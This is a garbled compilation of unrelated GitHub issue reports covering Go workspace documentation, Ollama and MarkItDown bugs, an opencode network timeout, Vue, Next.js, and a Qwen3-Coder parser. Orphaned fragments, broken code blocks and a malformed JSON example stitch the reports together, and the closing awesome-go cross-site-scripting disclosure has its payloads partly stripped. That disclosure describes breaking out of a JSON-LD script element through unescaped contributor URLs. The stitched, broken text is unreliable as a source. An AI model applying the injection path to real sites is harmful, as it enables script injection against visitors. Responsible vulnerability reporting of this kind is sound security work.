```shell
set GOTMPDIR=
set GOTOOLCHAIN=auto
set GOTOOLDIR=U:\GoogleSource\go\pkg\tool\windows_amd64
set GOVCS=
set GOVERSION=go1.28-devel_2ff5743d9f Sat Sep 26 15:27:19 2026 -0700
set GOWORK=
set PKG_CONFIG=pkg-config
```

### What did you do?

- Check the [Add modules to workspace file](https://pkg.go.dev/cmd/go#hdr-Add_modules_to_workspace_file) section in the Go command documentation page (generated from [`src/cmd/go/internal/workcmd/use.go`](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L32-L34)):

  The documentation currently states:
  > A use directive will be added to the go.work file for each argument
  > directory listed on the command line go.work file, if it exists,
  > or removed from the go.work file if it does not exist.

- Verify the documented behavior with a sample workspace:

  ```shell
  # create workspace with three modules
  mkdir workspace && cd workspace
  mkdir a && cd a && go mod init a && cd ..
  mkdir b && cd b && go mod init b && cd ..
  mkdir c && cd c && go mod init c && cd ..
  go work init a b c

  # Case A: Argument directory exists and contains go.mod
  go work use a

  # Case B: Argument directory exists but does not contain go.mod
  rm b/go.mod
  go work use b

  # Case C: Argument directory does not exist on disk
  rm -r c   # in powershell: rm -Recurse c
  go work use c
  ```

### What did you see happen?

#### Case A (`go work use a`)

The `use a` directive is retained in `go.work` (exit code 0).

#### Case B (`go work use b`)

Even though the directory exists, the `use b` directive is **removed** from `go.work` (exit code 0) because removal is governed by the absence of `go.mod`, which is not mentioned in the documentation.

#### Case C (`go work use c`)

The documentation states that the directive will be removed from `go.work` if the argument directory does not exist. But the command fails with an error:

```shell
$ go work use c
go: directory c does not exist
go: open U:\workspace\c\go.mod: The system cannot find the path specified.
```

The command exits with exit code 1 without modifying `go.work`. The `use c` directive is **not** removed:

```text
go 1.22
use (
    a
    c
)
```

#### Summary

- **Documented behavior:** A `use` directive is added if the argument directory exists and removed if it does not exist.
- **Actual behavior:** A `use` directive is only removed when the argument directory exists on disk but does not contain a `go.mod` file (Case B). When an argument directory does not exist on disk (Case C), the command errors out and leaves `go.work` completely unmodified.
- **Typo:** [`"directory listed on the command line go.work file, if it exists"`](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L33) has an extra `"go.work file"` after `"command line"`.

### What did you expect to see?

Expected either the documentation to accurately reflect the actual implementation (along with fixing the typo), or the implementation to match the documented behavior:

#### Proposed Solution

1. Fix the typo in [`src/cmd/go/internal/workcmd/use.go`](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L33) by removing the extra `"go.work file"` after `"command line"`.   

2. For the behavior discrepancy, either:

   - **Option A (Update documentation to match implementation):**
     Clarify that directives are added if the argument directory contains a `go.mod` file, or removed if it does not:

     ```diff
       A use directive will be added to the go.work file for each argument
     - directory listed on the command line go.work file, if it exists,
     - or removed from the go.work file if it does not exist.
     + directory listed on the command line, if it contains a go.mod file,
     + or removed from the go.work file if it does not.
     ```

     Regenerate `alldocs.go` via `go generate cmd/go`.

   - **Option B (Update implementation to match documentation):**
     Change `go work use` to drop the directive from `go.work` when the argument directory does not exist, rather than failing with `directory ... does not exist`.
     
     *(Note: `go work edit -dropuse=<dir>` is already available for removing directives without requiring the directory to exist on disk).*

3. The following related documentation pages in `golang/website` will also need to be updated with the revised description:
   - [Go Modules Reference: go work use](https://go.dev/ref/mod#go-work-use) (source: [`_content/ref/mod.md#L2846-L2848`](https://github.com/golang/website/blob/f2661d967b28530da480f0a1da9a4279026d34ca/_content/ref/mod.md?plain=1#L2846-L2848))
   - [Workspaces Tutorial: Learn more about workspaces](https://go.dev/doc/tutorial/workspaces#learn-more-about-workspaces) (source: [`_content/doc/tutorial/workspaces.md#L272-L274`](https://github.com/golang/website/blob/f2661d967b28530da480f0a1da9a4279026d34ca/_content/doc/tutorial/workspaces.md?plain=1#L272-L274), related issue: [#81779](https://github.com/golang/go/issues/81779))


### Analysis

Inspecting [`src/cmd/go/internal/workcmd/use.go`](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go) (function `workUse`) and verifying with runtime tests shows how each case is handled:

| Scenario | Command Behavior | Effect on `go.work` | Exit Code |
| :--- | :--- | :--- | :---: |
| **Case A: Directory exists with valid `go.mod`** (`go work use a`) | `lookDir` finds `go.mod`, checks that it is regular, and records it in `keepDirs` ([L128](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L128)). | **Adds or keeps** the `use` directive via `wf.AddUse`. | `0` |
| **Case B: Directory exists, but has no `go.mod`** (`go work use b`) | `lookDir` encounters `os.IsNotExist` for `go.mod` and sets `keepDirs[absDir] = ""` ([L113](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L113)). | **Removes directive**. If `b` was in `go.work`, `wf.DropUse` removes it. | `0` |
| **Case C: Directory does not exist on disk** (`go work use c`) | Fails with `go: directory c does not exist` ([L138-L140](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L138-L140), [L227](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L227)). | **None**. Even if `c` was previously in `go.work`, the command exits before saving the file. | `1` |
| **Recursive flag** (`go work use -r <dir>`) | `<dir>` must exist. Subdirectories are walked recursively via `fsys.WalkDir`. | Adds directories containing `go.mod`. Drops directories without `go.mod`. Also **removes subdirectories under `<dir>` that previously existed in `go.work` but were deleted from disk** ([L178-L184](https://github.com/golang/go/blob/2ff5743d9fd52fac166225e75df0c2c1edf82abb/src/cmd/go/internal/workcmd/use.go#L178-L184)). | `0` |

### History

<details>
<summary>Click to expand related commit history</summary>

Tracing the history of `src/cmd/go/internal/workcmd/use.go`:

1. **Commit [`fdee1b297438`](https://github.com/golang/go/commit/fdee1b297438a64c553ecc7468a7647f5a070404) (Oct 2021) — Initial implementation:**
   Originally, `lookDir` only checked `os.Stat(filepath.Join(dir, "go.mod"))` and did not validate whether `dir` itself existed on disk. If `dir` did not exist, `os.IsNotExist` matched and any matching directive in `go.work` was dropped without an error.

2. **Commit [`0c24038d22a8`](https://github.com/golang/go/commit/0c24038d22a83c0da5feb3d700b13445f47b24c9) (Dec 2021) — Initial documentation:**
   The command documentation was added to reflect the initial behavior:
   > *"A use directive will be added to the go.work file for each argument directory listed on the command line go.work file, if it exists on disk, or removed from the go.work file if it does not exist on disk."*
   
   This commit also introduced the repeated phrase `"command line go.work file"`.

3. **Commit [`a84ef500213e`](https://github.com/golang/go/commit/a84ef500213ef6c2a0e4bfd82253e9fcd28f1f62) (Mar 2022, fixes [#51749](https://github.com/golang/go/issues/51749)):**
   Added a check for regular files (`if target, err := fsys.Stat(useDir); err == nil && !target.IsDir()`). If `useDir` did not exist at all, `err != nil`, so execution still fell through to `lookDir(useDir)` (preserving silent removal for non-existent directories).

4. **Commit [`492c85ab84dc`](https://github.com/golang/go/commit/492c85ab84dc1d4d19be0466d2d73f4a6174f07e) (Apr 2022, fixes [#51841](https://github.com/golang/go/issues/51841)):**
   Addressed an issue where `go work use -r does_not_exist` panicked with a nil pointer dereference inside `fsys.Walk`. `fsys.Stat(absArg)` was moved up front for all arguments:
   ```go
   info, err := fsys.Stat(absArg)
   if err != nil {
       if os.IsNotExist(err) {
           base.Errorf("go: directory %v does not exist", absArg)
       } else {
           base.Errorf("go: %v", err)
       }
       continue
   }
   ```
   Passing a non-existent directory argument became an error that halts execution via `base.ExitIfErrors()`. The command documentation was not updated at the time to reflect this change.

5. **Commit [`ce8146ed3361`](https://github.com/golang/go/commit/ce8146ed3361f584ba79427ac6c6d6fe9c297bea) (Jun 2023):**
   Added toolchain switching and updated the documentation for Go versions and *"fails if any remaining use directives refer to modules that do not exist"*. The phrase `"if it exists on disk"` was shortened to `"if it exists"`, but the first sentence and the `"command line go.work file"` wording remained.

6. **Commit [`94982a07825a`](https://github.com/golang/go/commit/94982a07825aec711f11c97283e99e467838d616) (Jul 2024, fixes [#68245](https://github.com/golang/go/issues/68245)):**
   Clarified the `-r` flag description by removing the second clause (`"namely, use directives will be added for directories that exist, and removed for directories that do not exist"`). The first paragraph remained unchanged.

</details>

issue_title: `clef-flash` decision model always fails on `/v1/systemone` — "Clef: non-finite logit" (CUDA) / "Clef: cannot open model" (CPU)
issue_description:
The decision model `clef-flash` (Q8_0, 9.1B) always fails on the `/v1/systemone`
endpoint. The same model works fine on `/v1/chat/completions`, and the larger
`clef:27b` (Q4_K_M) works on `/v1/systemone` on the same machine.

The error occurs on the very first forward pass (prompt processing), before any
token is generated.

### Environment

- Ollama: 0.35.1 (Windows 10.0.26300)
- GPU: NVIDIA GeForce RTX 4090, driver 13.4, backend `cuda_v13`
- CPU: AMD Zen4 (`ggml-cpu-zen4.dll`)
- Model: `clef-flash:9b` (identical manifest to `clef-flash:latest`), Q8_0, 9.1B, base Qwen3.5 9B
- `OLLAMA_MODELS=I:\AI\_run_docker_\ollama\models`
- `OLLAMA_CONTEXT_LENGTH=262144`, `OLLAMA_NUM_PARALLEL=1`, `OLLAMA_FLASH_ATTENTION=false`

### Steps to reproduce

```bash
ollama pull clef-flash

curl http://localhost:11434/v1/systemone -d '{
  "model": "clef-flash",
  "state": "Checkout has been failing for every customer for the last hour.",
  "questions": {
    "urgent": {"type": "noul", "instructions": "Is this support request urgent?"},

      "type": "score",
      "instructions": "How severe is the customer impact?",
      "criteria": ["No impact", "Minor", "Major", "Critical"]
    }
  }
}'
```

### Expected

HTTP 200 with the decision answers.

### Actual

HTTP 500:

```json
{"error":{"code":500,"message":"Clef: non-finite logit","type":"server_error"}}
```

### Logs

`server.log` (GPU / CUDA):

```
llama_model_loader: - kv  30: qwen35.decision.type str = clef
llama_model_loader: - kv  31: qwen35.decision.hidden_size u32 = 4096
llama_model_loader: - kv  32: qwen35.decision.width u32 = 1024

llama_model_loader: - kv  36: qwen35.decision.feedforward u32 = 4096
...

slot launch_slot_: id  0 | task 0 | processing task, is_child = 0
slot   operator(): id  0 | task 0 | new prompt, n_ctx_slot = 16384, n_keep = 0, task.n_tokens = 358
```

With `OLLAMA_LLM_LIBRARY=cpu` (CPU-only) the error changes but the request still fails:

```

[GIN] 2026/10/03 - 10:48:03 | 500 | 5.0045232s | POST "/v1/systemone"
```

### Additional context

- `clef-flash` works on `/v1/chat/completions` (HTTP 200) — the base model itself is fine.
- `clef:27b` (Q4_K_M, 27B, base Qwen3.8 27B, also has a `qwen35.decision.*` head with
  `hidden_size=5120`) works on `/v1/systemone` (HTTP 200).
- Models without a Clef decision head (`nimble`, `tev1:0.8b`, `tev1:4b`) work on `/v1/systemone`.

issue_title: DOCX math: a boxed formula (`<m:borderBox>`) and everything inside it are dropped
issue_description:
When a Word equation contains a border box (`<m:borderBox>`), MarkItDown drops the element and all of its content without any warning. An equation that is boxed as a whole converts to an empty `$$$$`.

Word writes `<m:borderBox>` for its "Boxed Formula" equation structure.

## Repro

```python
from xml.etree import ElementTree as ET
from markitdown.converter_utils.docx.math.omml import OMML_NS, oMath2Latex

M = f'xmlns:m="{OMML_NS[1:-1]}"'

def latex(xml):
    return oMath2Latex(ET.fromstring(f"<m:oMath {M}>{xml}</m:oMath>")).latex

e_mc2 = ("<m:r><m:t>E=m</m:t></m:r><m:sSup><m:e><m:r><m:t>c</m:t></m:r></m:e>"
         "<m:sup><m:r><m:t>2</m:t></m:r></m:sup></m:sSup>")

print(repr(latex(f"<m:borderBox><m:borderBoxPr><m:ctrlPr/></m:borderBoxPr>"
                 f"<m:e>{e_mc2}</m:e></m:borderBox>")))
# -> ''

print(repr(latex("<m:r><m:t>a+</m:t></m:r>"
                 "<m:borderBox><m:e><m:r><m:t>b</m:t></m:r></m:e></m:borderBox>"
                 "<m:r><m:t>=c</m:t></m:r>")))
# -> 'a+=c'
```

End to end: I added a paragraph with a boxed `E=mc^2` to a copy of `tests/test_files/equations.docx`, placed between the paragraphs `BEFORE` and `AFTER`. `MarkItDown().convert()` returns `BEFORE\n\n$$$$\n\nAFTER`.

## Expected vs actual

| Input | Expected | Actual |
|---|---|---|
| `<m:borderBox>` around `E=mc^2` | `\boxed{E=mc^{2}}` | `''` |
| `a+` `<m:borderBox>b</m:borderBox>` `=c` | `a+\boxed{b}=c` | `a+=c` |

ISO/IEC 29500-1 says `borderBox` (Border-Box Object) "specifies the Border Box object, consisting of a border drawn around an instance of mathematical text (such as a formula or equation)". Its children are an optional `borderBoxPr` and one `e` that holds ordinary math content. When `borderBoxPr` is omitted, the default is a full rectangular border. The [Open XML SDK `BorderBox` reference](https://learn.microsoft.com/en-us/dotnet/api/documentformat.openxml.math.borderbox) reproduces this text. Dropping the `e` content loses document text silently. At minimum the content should be kept, and `\boxed{...}` is the direct LaTeX equivalent of a full border.

## Cause

In `packages/markitdown/src/markitdown/converter_utils/docx/math/omml.py`, `oMath2Latex.tag2meth` has no entry for `borderBox`, and `__direct_tags` lists `box` but not `borderBox`. `process_unknow` returns `None` for the tag, so `process_children_list` skips the element together with its children.

## Suggested fix

Add a `do_borderbox` handler that renders `process_children_dict(elm).get("e", "")` as `\boxed{...}`, with the template in `latex_dict.py`. It must not require `<m:borderBoxPr>`. The `hide*` and `strike*` flags in `borderBoxPr` (partial borders, strike lines) have no direct LaTeX equivalent, so ignoring them and emitting `\boxed{}` covers Word's default "Boxed Formula".

## Environment

- markitdown `main` at 1f9530a (0.1.8)
- Python 3.13, macOS

I have a fix and a regression test ready on a branch and will open the PR for this myself.

issue_title: PPTX: one unrecognized shape type aborts the whole presentation
issue_description:
A single shape whose type `python-pptx` can't identify makes MarkItDown fail the entire PPTX, losing every slide.

### Repro

Convert a deck containing an unrecognized shape (docling ships one: [`powerpoint_unrecognized_shape.pptx`](https://github.com/docling-project/docling/blob/main/tests/data/pptx/sources/powerpoint_unrecognized_shape.pptx), slide 2 has a shape named `BadShape`). It raises and returns nothing, though the other two slides are ordinary:

```
PptxConverter threw NotImplementedError with message: Shape instance of unrecognized shape type
```

`PptxConverter` reads `shape.shape_type` (in `_is_picture`, `_is_table`, and the group-shape check); for an unmapped shape that access raises and propagates out of `convert()`.

### Expected

One unreadable shape should be skipped and the rest of the deck converted, in the same spirit as the tolerance fixes already merged for `PptxConverter`: #2059 (tolerate `None` shape/notes text), #2194 (chart title without a text frame), and #2408 (top-zero sort).

The PR is written and tested; it adds a small `_shape_type_or_none()` helper that returns the type or `None` on `NotImplementedError`, so the shape falls through as "none of the handled types" and its own text is still recovered.

```go
type GetUsersParams {
```

If I could call versions of these functions simply didn't call `validate` as their last step, and then called `validate` myself once at the end, this would be simple.

issue_title: Remote MCP servers fail to connect when endpoint RTT is above ~250ms (autoSelectFamilyAttemptTimeout too small)
issue_description:
## Description

Remote MCP servers whose endpoint RTT exceeds ~250ms never load. On every session start opencode logs:

```
level=WARN run=7f94844c message="server unavailable" key=deepwiki type=remote status=failed
```

The server's healthy and reachable. curl completes a full MCP `initialize` handshake against the same URL and gets a valid result. The client's own TCP connect is what fails, so the tools never get registered. Startup drags too, since `connectRemote` tries StreamableHTTP and then SSE, and each attempt burns its own timeout before the warning shows up.

## Plugins

None

## OpenCode version

1.18.34 (the `opencode` deb package, `@opencode-ai/desktop`). 

## Steps to reproduce

1. Be more than ~250ms RTT from the remote MCP endpoint. Much of the world is, for anything hosted in US or EU regions.
2. Add a remote server: `"deepwiki": { "type": "remote", "url": "https://mcp.deepwiki.com/mcp", "enabled": true }`
3. Start opencode and watch `~/.local/share/opencode/log/opencode.log` for the line above.
4. Reproduce outside opencode on the same host:

```
$ node -e "fetch('https://mcp.deepwiki.com/mcp',{method:'POST'}).catch(e=>console.log(e.code||e.cause?.code))"
UND_ERR_CONNECT_TIMEOUT

$ NODE_OPTIONS=--network-family-autoselection-attempt-timeout=2000 \
  node -e "fetch('https://mcp.deepwiki.com/mcp',{method:'POST'}).then(r=>console.log(r.status))"
400
```

Three runs fail without the flag, three succeed with it. The 400 is expected, since that POST carries no MCP body. The point is that the TCP and TLS handshakes now complete.

## Screenshot and/or share link

Not applicable, there's no UI to capture. The log line above is the whole symptom.

## Operating System

Ubuntu 24.04, x86_64

## Terminal

n/a, opencode desktop app

## Root cause

`mcp.deepwiki.com` returns 3 A and 3 AAAA records, and the addresses rotate between lookups. TCP connect to the A records measures 263-412ms from here, 3 samples each. Node's happy-eyeballs connect windows every address attempt at 250ms by default (`autoSelectFamilyAttemptTimeout`), so each attempt gets destroyed just before it finishes. Sweeping that value on this host with `net.setDefaultAutoSelectFamilyAttemptTimeout()`:

```
250ms (default) -> no connect, attempt destroyed and no error surfaces
300ms           -> CONNECTED @901ms
400ms           -> CONNECTED @395ms
600ms           -> CONNECTED @294ms
```

Two failure signatures come out of this, depending on which addresses the pool hands back. Sometimes `fetch` fails in ~825ms with an `AggregateError [ETIMEDOUT]` listing every address. Other times `fetch` and `net.connect` hang with no error at all, which undici reports as `UND_ERR_CONNECT_TIMEOUT` after its 10s default. Instant failure and indefinite hang are the same bug.

For whoever picks this up: the warning comes from `Effect.logWarning("server unavailable", ...)` in `create`, and remote connects run through `connectRemote` in `packages/opencode/src/mcp/index.ts`. Nothing in that path touches `autoSelectFamilyAttemptTimeout`, and a search of the repo turns up zero references to it anywhere, so the 250ms default is inherited untouched. Config can't reach it either: `connectRemote` wraps each transport in `withTimeout(client.connect(t), mcp.timeout ?? 30_000)`, which sits well above the point where the TCP connect dies. In practice the failure surfaces earlier than that, at undici's 10s connect timeout, once per transport.

I couldn't instrument the Electron process directly. The connect path was verified with Node's `net` and `fetch` on the same host, and the client log line matches.

## Suggested fix

```ts
net.setDefaultAutoSelectFamilyAttemptTimeout(1000)
```

early in the process, before any MCP client is created. The cliff sits near 300ms and I measured up to 412ms, so 1000ms leaves headroom, and the value's a stagger interval rather than a wait, so fast connects aren't affected. Both Node and Bun implement the API. Retrying with `family: 4` after a connect failure would cover the remaining cases.

Workaround I'm using for now that works: pin one endpoint IP in /etc/hosts. Single-address lookups skip the race entirely so the connect completes. But it's obviously fragile.

issue_title: Extending object syntax of v-on to support modifiers
issue_description:
### What problem does this feature solve?
The object syntax of the v-on directive is vital in achieving conditional binding of event listeners, as shown in the discussions at https://github.com/vuejs/vue/issues/7349.

    <div v-on="{ mouseover: condition ? handler : null }">

However, the current object syntax does not allow modifiers.

This feature request suggest that we extend the object syntax in the following way to allow modifiers.

    <div v-on="{ click: { left: { prevent: condition ? leftClickHandler : null } },  mouseover: { stop: mouseoverHandler } }">

The above example would conditionally install leftClickHandler on "click.left.prevent" and mouseoverHandler on "mouseover.stop".

The embedded object notation is also conceptually consistent with the dot-notation already adopted in both function and inline syntax.


### What does the proposed API look like?
The proposed v-on object syntax would like like this, which is an extension of the current syntax.

    <div v-on="{ click: { left: { prevent: condition ? leftClickHandler : null } },  mouseover: { stop: mouseoverHandler } }">

In XLSX/XLS conversion, a single blank cell forces pandas to read its column as `float64`, so every whole number in that column renders with a `.0` suffix, inconsistent with clean columns beside it:

```python
'| 2.0 |',
```

```python

from openpyxl import Workbook
from markitdown import MarkItDown, StreamInfo

wb = Workbook(); ws = wb.active

buf = io.BytesIO(); wb.save(buf); buf.seek(0)
```

issue_title: XLSX/XLS: float values rendered in 6-digit scientific notation, entered digits are dropped
issue_description:
### Description

XLSX/XLS conversion renders spreadsheet float values through pandas' `to_html` default, which formats floats with 6 significant digits in scientific notation. Entered values lose digits:

- `123456789.123` becomes `1.234568e+08` (the fractional part is gone)
- `0.1` becomes `1.000000e-01`
- `42` in a float column becomes `4.200000e+01`

Distinct from #53 (currency display formatting) and #2516 (blank-cell column upcasting): this happens in a clean all-float column with no blanks and no currency formats; the raw stored value itself is what gets mangled.

```python

from markitdown import MarkItDown, StreamInfo

ws["A1"] = "money"; ws["A2"] = 123456789.123; ws["A3"] = 0.1

print(MarkItDown().convert_stream(buf, stream_info=StreamInfo(extension=".xlsx")).markdown)
```

The shortest string that round-trips the stored value: `123456789.123`, `0.1`, `1e-10`.

issue_title: Qwen3-Coder tool parser changes number arguments outside int64 range
issue_description:
### What is the issue?

The Qwen3-Coder tool parser changes valid `number` arguments outside the `int64` range. For example, a tool call passing `x=1e20` becomes `{"x":9223372036854775807}` on macOS/ARM64, rather than `{"x":100000000000000000000}`. Negative values outside the range are also changed.

`parseTypedToolValue` parses the value as `float64`, then converts every whole-valued float to `int64`. Large finite numbers such as `1e20` have no fractional part but do not fit in `int64`. The conversion loses the original value before the tool call reaches the caller. This can affect scientific/calculation tools with a JSON Schema `number` parameter.

### Reproduction

Save the following outside the repository (for example `/tmp/tool-number.go`) and run `go run /tmp/tool-number.go` from the Ollama checkout. This exercises the actual registered parser and JSON serialization without running a model or server.

```go
package main

import (
	"encoding/json"
	"fmt"

	"github.com/ollama/ollama/api"
	"github.com/ollama/ollama/model/parsers"
)

func main() {
	var tools []api.Tool
	if err := json.Unmarshal([]byte(`[{"type":"function","function":{"name":"calculate","parameters":{"type":"object","properties":{"x":{"type":"number"}}}}}]`), &tools); err != nil {
		panic(err)
	}
	p := parsers.ParserForName("qwen3-coder")
	p.Init(tools, nil, nil)
	_, _, calls, err := p.Add("<tool_call><function=calculate>\n<parameter=x>\n1e20\n</parameter>\n</function></tool_call>", true)
	if err != nil {
		panic(err)
	}
	result, err := json.Marshal(calls[0].Function.Arguments)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(result))
}
```

Observed on `53fed26112817f7c55f664efb9e3f65f06cab7db`, Go 1.26.3, macOS/ARM64:

```json
{"x":9223372036854775807}
```

Expected:

```json
{"x":100000000000000000000}
```

The precise out-of-range integer conversion result can depend on the architecture; the original number should be preserved regardless.

The narrow fix is to retain the float when it falls outside the `int64` range, while retaining current integer conversion for whole numbers inside that range. The positive boundary needs an exclusive comparison because `float64(math.MaxInt64)` rounds to `1<<63`.

issue_title: regression/race makes dynamic routes 404 on big apps
issue_description:
### Link to the code that reproduces this issue

https://github.com/juliangruber/next-dev-partial-scan-repro

### To Reproduce

1. `npm install` (a postinstall script generates 5000 small filler pages/API routes so the initial scan has realistic size)
2. `npm run add-probe` — adds two `console.error` lines to `node_modules/next/dist/server/lib/router-utils/setup-dev-bundler.js` so the watcher's aggregation behavior is observable (no behavior change)
3. `npx next dev`
4. Watch the `[AGG-PROBE]` lines; optionally request `GET /api/123` (dynamic) and `GET /api/hello` (static) as soon as the server accepts connections. Background I/O+CPU load widens the window if the first aggregation comes back complete on your machine.

### Current vs. Expected behavior

**Current:** the dev server can report ready (and resolve `prepare()` for custom servers) while the initial pages-directory scan is still in flight. Observed on the fresh clone with no synthetic load:

```
[AGG-PROBE] aggregated fired at 1784883621550
[AGG-PROBE] routedPages count: 1 dynamic routes: 0 at 1784883621577    <-- this one gates readiness
[AGG-PROBE] aggregated fired at 1784883621955
[AGG-PROBE] routedPages count: 5003 dynamic routes: 1 at 1784883622185
```

The first `aggregated` callback saw 1 of 5003 pages and 0 dynamic routes, so `fsChecker.dynamicRoutes` is built from a nearly empty page list. Until a later aggregation rebuilds it, **every dynamic pages-router route returns the 404 page with `text/html`, while static routes keep working** (they resolve via on-demand filesystem checks instead of the dynamic-route table). In this minimal repro the window is a few hundred ms; on a loaded machine running a large app (~1000 pages, custom Express server) we observed the broken state 17+ seconds after listen, and it persists until the next aggregation.

**Cause:** #83628 (Next 16) lowered the dev watcher's watchpack `aggregateTimeout` from the 200ms default to 5ms. Watchpack's initial scan emits one change event per pre-existing file and fires `aggregated` `aggregateTimeout` ms after the *last* event. Any >5ms delay mid-scan fires the first aggregation with a partial `wp.getTimeInfoEntries()`. A control run with `aggregateTimeout: 200` (the pre-16 value) produces a single complete first aggregation (5003/5003, dynamic route present) even under heavy load.

**Expected:** readiness should gate on initial-scan completion, not on an aggregation-timer tick that can fire mid-scan. The first aggregation used for the route tables should always contain the complete page list (as it usually did with the 200ms default in Next ≤15).

### Provide environment information

```bash
Operating System:
  Platform: darwin
  Arch: arm64
  Version: Darwin Kernel Version 25.5.0: Tue Jun  9 22:28:34 PDT 2026; root:xnu-12377.121.10~1/RELEASE_ARM64_T6050
  Available memory (MB): 49152
  Available CPU cores: 18
Binaries:
  Node: 24.14.1
  npm: 11.11.0
  Yarn: N/A
  pnpm: 10.34.5
Relevant Packages:
  next: 16.3.0-canary.95
  eslint-config-next: N/A
  react: 19.1.1
  react-dom: 19.1.1
  typescript: N/A
Next.js Config:
  output: N/A
```

### Which area(s) are affected? (Select all that apply)

Dynamic Routes, Pages Router

### Which stage(s) are affected? (Select all that apply)

next dev (local)

### Additional context

- Introduced by #83628 ("Development: Make 'ready in' 195ms faster", first in 16.0.0); reproduced on 16.2.6 and 16.3.0-canary.95. Not bundler-specific: the same `startWatcher` watchpack callback builds `fsChecker.dynamicRoutes` for both Turbopack and webpack dev.
- Reproduces with plain `next dev`; also affects custom servers, where the partial first aggregation resolves `nextApp.prepare()`.
- Downstream workaround we're shipping (restores the pre-16 value via a package patch): https://github.com/SocketDev/depscan/pull/23093 (private repo, linked for cross-reference).

issue_title: avelino/awesome-go project page JSON-LD codeRepository field omits JSON escaping, letting contributor-controlled URLs close the script element and inject arbitrary script (CWE-79)
issue_description: # avelino/awesome-go project page JSON-LD codeRepository field omits JSON escaping, letting contributor-controlled URLs close the script element and inject arbitrary script (CWE-79) Last saved at 2026-09-11 ## Asset The static site generator embedded in the avelino/awesome-go repository (SOURCE_CODE) — `tmpl/project.tmpl.html`, `main.go`, `pkg/markdown/convert.go` — whose output is auto-deployed to the production site project detail pages **https://awesome-go.com/<category>/<slug>/** by `.github/workflows/site-deploy.yaml`. - Repository: https://github.com/avelino/awesome-go - Audited baseline: `main` branch HEAD commit `1ed3a46319b9e85d2fedcacc8cece2e0faf456b6`. The project has no formal versioned releases, so the affected code is delineated by commit (including the audited HEAD). - Deployment chain: push to `main` → `site-deploy.yaml` runs `go run .` → Netlify (`production-deploy: true`) → production site. ## Weakness Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (cwe-79). The injection occurs inside a `` closes the script element outright, and the attacker's following `` becomes a **new executable script element**. **Key delivery path:** goldmark URL-encodes `"` inside plain markdown link destinations as `%22` (that path was disproven as injectable by a real build); however, `html.WithUnsafe()` (`convert.go:24`) allows raw inline HTML anchors in the README, whose attribute values pass through **verbatim including HTML entities** (`"` etc.), and goquery's `Attr("href")` then **decodes the entities back to raw characters** (`main.go:324`) — bypassing goldmark's URL-encoding layer. `parseRepoURL` (`main.go:440`; `url.Parse` tolerates `"`/`<`/`>`, and a github.com hostname with ≥2 path segments passes per `main.go:448-452`) lets the payload enter `Project.URL` intact (`main.go:479`). ### Finding A: the jsonEscape coverage gap — `codeRepository` and the repo link are both unescaped **Files:** `tmpl/project.tmpl.html:41-79` (JSON-LD block), `main.go:94-100` (jsonEscape implementation) ```html "name": "{{jsonEscape .Title}}", "description": "{{jsonEscape .Description}}", ... "codeRepository": "{{.URL}}"{{if .Meta}}, ... ``` ```go // main.go:94-100 "jsonEscape": func(s string) string { b, _ := json.Marshal(s) if len(b) < 2 { return "" } return string(b[1 : len(b)-1]) }, ``` Control evidence from the same build: the `Title` of the V1 sample (containing ``) is correctly escaped in the JSON-LD as `\u003cimg src=x onerror=alert(1)\u003e` (`workdir/poc/env_awesome-go/out/security-tools/v1-victim-evil-github/index.html:43`), proving that `jsonEscape` exists and works for Title/Description — **only `.URL` was missed**. ### Finding B: raw inline HTML + goquery entity decoding forms the quote delivery path **Attacker input** (a README entry; `workdir/poc/malicious_README.md:25`): ```markdown - V4 Demo - desc ``` Chain: ① `convert.go:24` WithUnsafe outputs the raw inline HTML anchor byte-for-byte; ② during goquery parsing, `selLink.Attr("href")` (`main.go:324`) **decodes the entities** `"`/`>`/`<` back to raw `"`/`>`/`<`; ③ `parseRepoURL` (`main.go:440`) accepts URLs containing these characters via `url.Parse`, and the hostname `github.com` with ≥2 path segments (`evil/v4-jsonld...`) passes (`main.go:448-452`); ④ `Project.URL` carries the raw double quote and `` (`main.go:479`); ⑤ when rendered by `text/template` (`main.go:749`), `{{.URL}}` is written verbatim to :51 and :112; ⑥ the goquery re-serialization (`main.go:753-758`) sanitizes nothing. ### Finding C: the actual form of both injection points in the artifact Sink ① (JSON-LD, `workdir/poc/env_awesome-go/out/security-tools/v4-jsonld-evil-github/index.html:49`): ```html "codeRepository": "https://github.com/evil/v4-jsonld">", ``` The raw `"` escapes the JSON string and `` genuinely closes the ld+json script element (goquery's re-parse proves the context break: the residual JSON degrades to body text re-encoded as `"`, with a `` recombination appearing); the following `` is an **executable script element with no type attribute**, located in the head, executing as soon as the browser loads the page. Sink ② (href attribute, same file `:106`): ```html " rel="nofollow noopener" ... ``` The href attribute terminates at the raw `"`, and `` is injected as an element and executes. One URL data flow, two unescaped sinks. Cross-confirmation: artifacts of an independent reproduction workflow, `workdir/poc/v4-rawhtml-out/repo5_index.html:49` (entity-encoded variant) and `repo6_index.html:49` (single-quoted href with literal quotes variant), show the identical JSON-LD escape and script injection; see `workdir/poc/V4_RAWHTML_BREAKOUT_EVIDENCE.md`. Secondary injection surface: the category page JSON-LD also renders `{{.Title}}`/`{{.Description}}` without jsonEscape (`tmpl/category-index.tmpl.html:45-46`) — same root cause. ### Versions Verified | Version | jsonEscape on Title/Description | Escaping of codeRepository `.URL` | Escaping of href `.URL` | Live script in artifacts | |---|---|---|---|---| | avelino/awesome-go main @ `1ed3a46` (audited tree) | Applied (`project.tmpl.html:45/46/68/74`) | **Missing** (`:51`) | **Missing** (`:112`) | Confirmed (see Finding C) | The poisoned project page built locally with the real generator contains an executable `` 